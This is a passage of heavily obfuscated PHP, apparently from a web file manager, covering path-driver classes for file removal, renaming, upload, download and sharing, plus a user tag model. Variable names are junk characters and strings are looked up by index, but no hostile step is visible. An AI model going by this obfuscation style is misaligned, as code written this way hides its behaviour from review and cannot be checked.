$ĞËÒÒ²Ã[$_SERVER[¬ÏÕ§Áú][492]], $»ö™ïÂè, $İ‡É×éÎ); return $úÓÌé¨² ? $this->getPathOuter($úÓÌé¨²) : !1; } public function remove($ÀÊì¿„á, $ÆëÒÙÈß = true) { return $this->model->remove($ÀÊì¿„á, $ÆëÒÙÈß); } public function rename($›ÑëÃ‚, $†°ù»†¥) { $ğ‡ò¤Îí = $this->model->rename($›ÑëÃ‚, $†°ù»†¥); return $ğ‡ò¤Îí ? $this->getPathOuter($›ÑëÃ‚) : $ğ‡ò¤Îí; } public function size($¤æ¨‘×¯) { $Ÿ«ÂŸƒÄ = $this->infoSimple($¤æ¨‘×¯); return $Ÿ«ÂŸƒÄ ? $Ÿ«ÂŸƒÄ[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function infoSimple($° ŒÇá˜) { return $this->model->sourceInfo($° ŒÇá˜); } public function info($—ÔÏÎ¿˜) { return $this->infoParse($—ÔÏÎ¿˜); } public function infoAuth($“±Ïµ‡Ñ) { return $this->infoParse($“±Ïµ‡Ñ, !1, !0); } public function infoWithChildren($ª Î) { return $this->infoParse($ª Î, !0); } protected function infoParse($¥æÇ×ë, $â†¨—ß© = false, $ïÀİ˜Ÿ = false) { if (!$â†¨—ß©) { return $this->model->pathInfo($¥æÇ×ë, $ïÀİ˜Ÿ); } return $this->model->pathInfoMore($¥æÇ×ë); } public function infoFullSimple($ú¸ğŞ‚Ò) { $å‰ ¶ø =& $_SERVER[¬ÏÕ§Áú]; $ÈœÊÇü” = explode($å‰ ¶ø[8], $ú¸ğŞ‚Ò); $¼ÃÌøšç = implode($å‰ ¶ø[8], array_splice($ÈœÊÇü”, 1)); return $this->model->pathInfoByPath($ÈœÊÇü”[0], $¼ÃÌøšç); } public function infoFull($ëë§÷ïÁ) { $‚€–Áô = $this->infoFullSimple($ëë§÷ïÁ); return is_array($‚€–Áô) ? $this->model->pathInfo($‚€–Áô[$_SERVER[¬ÏÕ§Áú][204]]) : !1; } public function hashSimple($ÅìØÀ«„) { $şâ¯‰á =& $_SERVER[¬ÏÕ§Áú]; $±àµ´¶ì = $this->infoWithChildren($ÅìØÀ«„); return $±àµ´¶ì[$şâ¯‰á[180]][$şâ¯‰á[696]]; } public function hashMd5($Í–Úñ£²) { $®òŠ¹Õ¹ =& $_SERVER[¬ÏÕ§Áú]; $´î¢„Ä = $this->infoWithChildren($Í–Úñ£²); return $´î¢„Ä[$®òŠ¹Õ¹[180]][$®òŠ¹Õ¹[568]]; } public function exist($èõô´û) { $Æ´ô¸ö¬ =& $_SERVER[¬ÏÕ§Áú]; $§»ÖîÉ« = $this->parse($èõô´û); if (!$§»ÖîÉ«[$Æ´ô¸ö¬[97]]) { return $this->isFile($èõô´û) || $this->isFolder($èõô´û); } $ù¼‡Ùë¹ = array($Æ´ô¸ö¬[497] => $§»ÖîÉ«[$Æ´ô¸ö¬[492]], $Æ´ô¸ö¬[32] => $§»ÖîÉ«[$Æ´ô¸ö¬[97]]); $øÛŠÅü = $this->model->where($ù¼‡Ùë¹)->find(); return $øÛŠÅü ? !0 : !1; } public function isFile($™ÂÉ¢) { $ÏÌŞÌŒ— =& $_SERVER[¬ÏÕ§Áú]; $àÀÉ–Ò÷ = $this->infoSimple($™ÂÉ¢); return $àÀÉ–Ò÷ && $àÀÉ–Ò÷[$ÏÌŞÌŒ—[505]] == $ÏÌŞÌŒ—[241] ? !0 : !1; } public function isFolder($©ÜîİîÂ) { $êƒˆƒí =& $_SERVER[¬ÏÕ§Áú]; $­¾š²†¢ = $this->infoSimple($©ÜîİîÂ); return $­¾š²†¢ && $­¾š²†¢[$êƒˆƒí[505]] == $êƒˆƒí[101] ? !0 : !1; } public function listPath($” Ğ›ÑÙ, $³Áº¡¹ı = false) { $Û¨‚û³Ù =& $_SERVER[¬ÏÕ§Áú]; if ($” Ğ›ÑÙ == $Û¨‚û³Ù[12]) { return !1; } $ÑÂÊ¼ßß = array($Û¨‚û³Ù[497] => $” Ğ›ÑÙ); if ($³Áº¡¹ı) { return $this->model->listSource($ÑÂÊ¼ßß, -1); } return $this->model->listSource($ÑÂÊ¼ßß); } public function has($ÓøÀë»œ, $üŒ°ˆÊ = false, $¡Òã÷¶ = null) { $ŸÑ©ï‹ =& $_SERVER[¬ÏÕ§Áú]; $ü†€ÒÄ = $this->infoWithChildren($ÓøÀë»œ); if ($üŒ°ˆÊ) { return array($ŸÑ©ï‹[253] => $ü†€ÒÄ[$ŸÑ©ï‹[253]], $ŸÑ©ï‹[252] => $ü†€ÒÄ[$ŸÑ©ï‹[252]]); } return $¡Òã÷¶ ? $ü†€ÒÄ[$ŸÑ©ï‹[253]] : $ü†€ÒÄ[$ŸÑ©ï‹[252]]; } public function listAll($–ìöø¯ˆ) { $ËÒ„¿Ü¯ = IO::info($this->pathParse[$_SERVER[¬ÏÕ§Áú][97]]); if (!$ËÒ„¿Ü¯) { return array(); } return $this->model->listAll($–ìöø¯ˆ); } public function getContent($ØãëùÓ¯) { return $this->model->getContent($ØãëùÓ¯); } public function setContent($Œ´°Äî´, $ªú ‚üĞ = '') { return $this->model->setContent($Œ´°Äî´, $ªú ‚üĞ); } public function fileSubstr($œ½Çò«·, $á êİ÷“, $ºœê„õ ) { return $this->model->fileSubstr($œ½Çò«·, $á êİ÷“, $ºœê„õ ); } public function download($’ıÌµ¦², $ªÅØ¨³¡ = '') { $ù×ÄœÙ = get_path_father($ªÅØ¨³¡); $òï•ßïŠ = get_path_this($ªÅØ¨³¡); $’ç±¥ã¹ = $this->model->fileInfoGet($’ıÌµ¦²); $ÒŞ‘ÛŒØ = IO::copy($’ç±¥ã¹[$_SERVER[¬ÏÕ§Áú][97]], $ù×ÄœÙ, !1, $òï•ßïŠ); return $ÒŞ‘ÛŒØ; } public function setModifyTime($ĞòŠİ‡’, $°şâÃ¸õ = '') { $‡Üû™ˆÈ =& $_SERVER[¬ÏÕ§Áú]; if (!$ĞòŠİ‡’) { return; } $this->model->where(array($‡Üû™ˆÈ[511] => $ĞòŠİ‡’))->save(array($‡Üû™ˆÈ[98] => $°şâÃ¸õ)); } public function upload($æ³êÈ›Ò, $ËÌÕŸ¤É, $á¥¬´‹ = false, $Ñêã´ ¯ = REPEAT_REPLACE) { $¾¯¼ò©Å =& $_SERVER[¬ÏÕ§Áú]; $¯ıº£ü = $this->parse($æ³êÈ›Ò); $»¨÷à²Ù = $this->model->addFile($¯ıº£ü[$¾¯¼ò©Å[492]], $ËÌÕŸ¤É, $¯ıº£ü[$¾¯¼ò©Å[97]], $á¥¬´‹, $Ñêã´ ¯); return $this->getPathOuter($»¨÷à²Ù); } public function uploadFileByID($˜£®¯áñ, $Í±ÙƒÂ, $Ô«Ï¸‘ç) { $¿“óõšï =& $_SERVER[¬ÏÕ§Áú]; $ÜŞ°¶·Ã = $this->parse($˜£®¯áñ); $¨ˆêØÇ = $this->model->addFileByFileID($ÜŞ°¶·Ã[$¿“óõšï[492]], $Í±ÙƒÂ, $ÜŞ°¶·Ã[$¿“óõšï[97]], $Ô«Ï¸‘ç); return $this->getPathOuter($¨ˆêØÇ); } public function addFileByRemote($ş…ØçÜ¤, $œ©á‰Œª, $®÷ñ“âÀ = array(), $‰”ÌŞ˜¡ = '', $ú‡­ÄÜ) { $•·¬¸ ¤ =& $_SERVER[¬ÏÕ§Áú]; $—ÇÉ¤ÄÖ = $this->parse($ş…ØçÜ¤); $‰”ÌŞ˜¡ = empty($‰”ÌŞ˜¡) ? $—ÇÉ¤ÄÖ[$•·¬¸ ¤[97]] : $‰”ÌŞ˜¡; $¦¬Ñî° = $this->model->addFileByRemote($—ÇÉ¤ÄÖ[$•·¬¸ ¤[492]], $œ©á‰Œª, $‰”ÌŞ˜¡, $®÷ñ“âÀ, $ú‡­ÄÜ); return $this->getPathOuter($¦¬Ñî°); } public function uploadLink($²¢ó¯Ùİ, $ú¶ãğÙ­ = 0) { $ŒéÚÒ¨« =& $_SERVER[¬ÏÕ§Áú]; $ÃÅœÕ± = $this->parse($²¢ó¯Ùİ); $ĞÉîŠãÑ = _get($GLOBALS[$ŒéÚÒ¨«[7]], $ŒéÚÒ¨«[1485]); $ÖÅ¬Å = _get($GLOBALS[$ŒéÚÒ¨«[7]], $ŒéÚÒ¨«[1486]); $Äƒ’éÛ = KodIO::ioFileDriverGet($ŒéÚÒ¨«[503] . $ÃÅœÕ±[$ŒéÚÒ¨«[492]] . $ŒéÚÒ¨«[413]); $Ôò†Ä„î = Model($ŒéÚÒ¨«[698])->createFileName($ÃÅœÕ±[$ŒéÚÒ¨«[97]], $Äƒ’éÛ, $ĞÉîŠãÑ, $ÖÅ¬Å); return IO::uploadLink($Ôò†Ä„î, $ú¶ãğÙ­); } public function fileNameAuto($¢»è³ˆó, $ù×ÂËÁç, $™ˆ—´‹® = REPEAT_REPLACE, $†ã¸ÊÌø = false) { return $this->model->fileNameAuto($¢»è³ˆó, $ù×ÂËÁç, $™ˆ—´‹®, $†ã¸ÊÌø); } public function fileNameExist($¢ÄœŞÍ, $šóÁÈÒØ) { return $this->model->fileNameExist($¢ÄœŞÍ, $šóÁÈÒØ); } protected function _fileOut($ ªØË¡ï, $³«ÅáĞ¯ = false, $¦¸¼æ®— = false, $çÔ§ü×¨ = '', $µ¾âğ¤› = false) { $óëû—¹¡ =& $_SERVER[¬ÏÕ§Áú]; $˜†¸‰ºÕ = $this->model->sourceInfo($ ªØË¡ï); if ($˜†¸‰ºÕ[$óëû—¹¡[505]] == $óëû—¹¡[101]) { header($óëû—¹¡[1487]); die; } $Ü«È­šÅ = $this->model->fileInfoGet($ ªØË¡ï); $çÔ§ü×¨ = $Ü«È­šÅ[$óëû—¹¡[568]] ? $Ü«È­šÅ[$óëû—¹¡[568]] : $çÔ§ü×¨; $¸‘ü¨ÓÒ = isset($GLOBALS[$óëû—¹¡[193]]) && is_array($GLOBALS[$óëû—¹¡[193]]) ? $GLOBALS[$óëû—¹¡[193]][$óëû—¹¡[32]] : $˜†¸‰ºÕ[$óëû—¹¡[32]]; if ($µ¾âğ¤›) { return IO::fileOutServer($Ü«È­šÅ[$óëû—¹¡[97]], $³«ÅáĞ¯, $¸‘ü¨ÓÒ, $çÔ§ü×¨); } IO::fileOut($Ü«È­šÅ[$óëû—¹¡[97]], $³«ÅáĞ¯, $¸‘ü¨ÓÒ, $çÔ§ü×¨); } public function fileOut($Ó«Ì®Ù, $ËØŞ¤  = false, $çê ÅÔş = false, $Í‘—äÌ = '') { $this->_fileOut($Ó«Ì®Ù, $ËØŞ¤ , $çê ÅÔş, $Í‘—äÌ); } public function fileOutServer($üâ¢éœ«, $®ø…êö = false, $’ìçØ  = false, $ê±ïŸâ’ = '') { $this->_fileOut($üâ¢éœ«, $®ø…êö, $’ìçØ , $ê±ïŸâ’, !0); } protected function _fileOutImage($èÈ«ˆå, $í€ÏÇ‘ = 250) { $“ª»ÅÊÜ =& $_SERVER[¬ÏÕ§Áú]; $Ô¦Àê·… = $this->model->pathInfo($èÈ«ˆå); if ($Ô¦Àê·…[$“ª»ÅÊÜ[505]] == $“ª»ÅÊÜ[101]) { show_json($“ª»ÅÊÜ[1488] . $èÈ«ˆå, !1); } $¢ë©´·ã = $this->model->fileInfoGet($èÈ«ˆå); $Ô¦Àê·…[$“ª»ÅÊÜ[194]] = $¢ë©´·ã[$“ª»ÅÊÜ[97]]; $GLOBALS[$“ª»ÅÊÜ[193]] = $Ô¦Àê·…; IO::fileOutImage($¢ë©´·ã[$“ª»ÅÊÜ[97]], $í€ÏÇ‘); } public function fileOutImage($¯ŞıÓ, $€ó¾ÖÁÑ = 250) { $this->_fileOutImage($¯ŞıÓ, $€ó¾ÖÁÑ); } public function fileOutImageServer($ˆÍÓïœ…, $Êò€Ú³ = 250) { $this->_fileOutImage($ˆÍÓïœ…, $Êò€Ú³); } public function link($ÔüÏõ¬Œ, $²¬Çú®‹ = '') { $¨ò¯‘üÊ = $this->model->fileInfoGet($ÔüÏõ¬Œ); return IO::link($¨ò¯‘üÊ[$_SERVER[¬ÏÕ§Áú][97]], $²¬Çú®‹); } protected function parse($ÀÎĞÅ’Ô) { $»Á¿—º‡ =& $_SERVER[¬ÏÕ§Áú]; if (strstr($ÀÎĞÅ’Ô, $»Á¿—º‡[8]) === !1) { return array($»Á¿—º‡[513] => intval($ÀÎĞÅ’Ô), $»Á¿—º‡[97] => $»Á¿—º‡[12], $»Á¿—º‡[1484] => array()); } $Ñ£â¸Â€ = explode($»Á¿—º‡[8], trim($ÀÎĞÅ’Ô, $»Á¿—º‡[8])); if (count($Ñ£â¸Â€) < 2) { show_tips(clear_html($ÀÎĞÅ’Ô) . $»Á¿—º‡[1489]); } return array($»Á¿—º‡[513] => intval($Ñ£â¸Â€[0]), $»Á¿—º‡[97] => $Ñ£â¸Â€[1], $»Á¿—º‡[1484] => array_slice($Ñ£â¸Â€, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($à˜É”÷Î) { $this->pathParse = $à˜É”÷Î; $this->model = Model($_SERVER[¬ÏÕ§Áú][1483]); } public function getPathOuter($–áÑı¦à) { $Ÿ­‹ÜÂã =& $_SERVER[¬ÏÕ§Áú]; if (!$–áÑı¦à) { return $–áÑı¦à; } $À±ıİÉ = $this->parse($–áÑı¦à); return trim(KodIO::makeShare($this->pathParse[$Ÿ­‹ÜÂã[492]], $À±ıİÉ[$Ÿ­‹ÜÂã[492]]), $Ÿ­‹ÜÂã[8]); } protected function infoParse($‘é¢„’º, $‘¿±†ô“ = false, $üàÔ÷²¬ = false) { $»‘æáî =& $_SERVER[¬ÏÕ§Áú]; $€€Ï­‰Ğ = $this->pathParse[$»‘æáî[492]]; $£á–ëí… = trim($this->pathParse[$»‘æáî[1304]], $»‘æáî[8]); return Action($»‘æáî[1490])->sharePathInfo($€€Ï­‰Ğ, $£á–ëí…, $‘¿±†ô“); } public function infoFull($•§Ìçğö) { $° ·ğÔŞ =& $_SERVER[¬ÏÕ§Áú]; $™ûø¿„€ = explode($° ·ğÔŞ[8], trim($•§Ìçğö, $° ·ğÔŞ[8])); if (count($™ûø¿„€) > 1) { $Š„ş¦È’ = implode($° ·ğÔŞ[8], array_splice($™ûø¿„€, 1)); $ùé—‰ßÓ = $this->model->pathInfoByPath($™ûø¿„€[0], $Š„ş¦È’); if (!$ùé—‰ßÓ) { return !1; } $this->pathParse[$° ·ğÔŞ[1304]] = $ùé—‰ßÓ[$° ·ğÔŞ[204]]; } return $this->infoParse($•§Ìçğö); } public function listAll($Ñîó£åÁ) { $ÜõÙ·  =& $_SERVER[¬ÏÕ§Áú]; $Áã¸Ñóõ = IO::info($this->pathParse[$ÜõÙ· [97]]); if (!$Áã¸Ñóõ) { return array(); } $Å©Ö = $this->model->listAll($Ñîó£åÁ); $Ø‰±‡í = Model($ÜõÙ· [688])->getInfo($Áã¸Ñóõ[$ÜõÙ· [689]]); foreach ($Å©Ö as &$Ïü†ÉØ) { check_abort(); $Ïü†ÉØ[$ÜõÙ· [100]] = Action($ÜõÙ· [1490])->_shareItemeParse($Ïü†ÉØ[$ÜõÙ· [100]], $Ø‰±‡í); } unset($Ïü†ÉØ); return $Å©Ö; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ú´·Àó) { $this->pathParse = $Ú´·Àó; $this->model = Model($_SERVER[¬ÏÕ§Áú][1483]); } protected function infoParse($ì„”–ÀÙ, $ùé»³š = false, $÷Î éáØ = false) { $Ÿ‚ˆ½ìÏ =& $_SERVER[¬ÏÕ§Áú]; return Action($Ÿ‚ˆ½ìÏ[1311])->sharePathInfo($this->pathParse[$Ÿ‚ˆ½ìÏ[97]], !0, $ùé»³š); } public function listPath($»…“ùÕÔ, $§ú†Ù = false) { $ŸË®Ğé‹ =& $_SERVER[¬ÏÕ§Áú]; $šÈ˜ü®ğ = parent::listPath($»…“ùÕÔ, $§ú†Ù); if (!$šÈ˜ü®ğ) { return $šÈ˜ü®ğ; } if (is_array($šÈ˜ü®ğ[$ŸË®Ğé‹[1491]])) { $šÈ˜ü®ğ[$ŸË®Ğé‹[1491]] = Action($ŸË®Ğé‹[1311])->shareItemInfo($šÈ˜ü®ğ[$ŸË®Ğé‹[1491]]); } foreach ($šÈ˜ü®ğ as $ƒäàš†Ë => $äæšäã) { if (!in_array($ƒäàš†Ë, array($ŸË®Ğé‹[96], $ŸË®Ğé‹[95]))) { continue; } foreach ($äæšäã as $‹ÚİÊı— => $ÔşÁæÔ¬) { $šÈ˜ü®ğ[$ƒäàš†Ë][$‹ÚİÊı—] = Action($ŸË®Ğé‹[1311])->shareItemInfo($ÔşÁæÔ¬); } } return $šÈ˜ü®ğ; } public function listAll($÷¹­ÁÛú) { $ÍÁ¶û‹ˆ =& $_SERVER[¬ÏÕ§Áú]; $ÏØö‰¦Ü = IO::info($this->pathParse[$ÍÁ¶û‹ˆ[97]]); if (!$ÏØö‰¦Ü) { return array(); } $“Ü¶Ğ€œ = $this->model->listAll($÷¹­ÁÛú); foreach ($“Ü¶Ğ€œ as &$‡úÁ¡Şô) { $‡úÁ¡Şô[$ÍÁ¶û‹ˆ[100]] = Action($ÍÁ¶û‹ˆ[1311])->shareItemInfo($‡úÁ¡Şô[$ÍÁ¶û‹ˆ[100]]); } unset($‡úÁ¡Şô); return $“Ü¶Ğ€œ; } } goto E¢Ù„Òƒ™; Cš–´œ‘âÔ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($‹›èè÷ï) { $‡ùÍôĞ =& $_SERVER[¬ÏÕ§Áú]; return array($‡ùÍôĞ[2152] => array($‡ùÍôĞ[2594] . USER_ID, $‡ùÍôĞ[2153])); } protected function listData() { $¨¯öƒÂ• =& $_SERVER[¬ÏÕ§Áú]; $Ğš–ñß¹ = array($¨¯öƒÂ•[1828] => USER_ID, $¨¯öƒÂ•[578] => array($¨¯öƒÂ•[2156], 0)); $îã§¨¶€ = $¨¯öƒÂ•[2595]; $–½ê’¦è = $this->field($îã§¨¶€)->where($Ğš–ñß¹)->order($¨¯öƒÂ•[2158])->select(); return $–½ê’¦è ? $–½ê’¦è : array(); } protected function addToTag($Ò¬‡ŞÅÙ, $¡¼‹Üä‘) { $íù¹„…  =& $_SERVER[¬ÏÕ§Áú]; if (!Model($íù¹„… [2317])->listData($¡¼‹Üä‘)) { return !1; } if (is_numeric($Ò¬‡ŞÅÙ)) { $ÄğÙşÇì = Model($íù¹„… [946])->pathInfo($Ò¬‡ŞÅÙ); if (!$ÄğÙşÇì) { return !1; } } else { $ÄğÙşÇì = IO::infoSimple($Ò¬‡ŞÅÙ); if (!$ÄğÙşÇì) { return !1; } $»—ŸÆÖ = $ÄğÙşÇì[$íù¹„… [32]]; $ı¡€¬Í = $ÄğÙşÇì[$íù¹„… [33]]; if (isset($ÄğÙşÇì[$íù¹„… [505]])) { $ı¡€¬Í = $ÄğÙşÇì[$íù¹„… [505]] == $íù¹„… [101] ? $íù¹„… [88] : $íù¹„… [243]; } } $Á´ˆƒğŒ = array($íù¹„… [1828] => USER_ID, $íù¹„… [578] => $¡¼‹Üä‘, $íù¹„… [515] => $Ò¬‡ŞÅÙ, $íù¹„… [516] => $ı¡€¬Í ? $ı¡€¬Í : $íù¹„… [510], $íù¹„… [514] => $»—ŸÆÖ ? $»—ŸÆÖ : $íù¹„… [12], $íù¹„… [2041] => 0); if ($this->where($Á´ˆƒğŒ)->find()) { return !1; } return $this->add($Á´ˆƒğŒ); } protected function removeFromTag($…‡í†°Ë, $Å¹Óë¶) { $¬² ¶İ =& $_SERVER[¬ÏÕ§Áú]; if (!Model($¬² ¶İ[2317])->listData($Å¹Óë¶)) { return !1; } if (is_array($…‡í†°Ë)) { $…‡í†°Ë = array($¬² ¶İ[7], $…‡í†°Ë); } $ûôÊè‚™ = array($¬² ¶İ[1828] => USER_ID, $¬² ¶İ[578] => $Å¹Óë¶, $¬² ¶İ[515] => $…‡í†°Ë); return $this->where($ûôÊè‚™)->delete(); } protected function removeByTag($Üèçá·×) { $Â´æÒá =& $_SERVER[¬ÏÕ§Áú]; if (!$Üèçá·×) { return !1; } $Ü‚¦¸Ø = array($Â´æÒá[1828] => USER_ID, $Â´æÒá[578] => $Üèçá·×); return $this->where($Ü‚¦¸Ø)->delete(); } protected function removeBySource($ƒËü Ú¾) { $‚îí™èÉ =& $_SERVER[¬ÏÕ§Áú]; if (is_array($ƒËü Ú¾)) { $ƒËü Ú¾ = array($‚îí™èÉ[7], $ƒËü Ú¾); } $âÛı­êà = array($‚îí™èÉ[1828] => USER_ID, $‚îí™èÉ[578] => array($‚îí™èÉ[1139], 0), $‚îí™èÉ[515] => $ƒËü Ú¾); return $this->where($âÛı­êà)->delete(); } }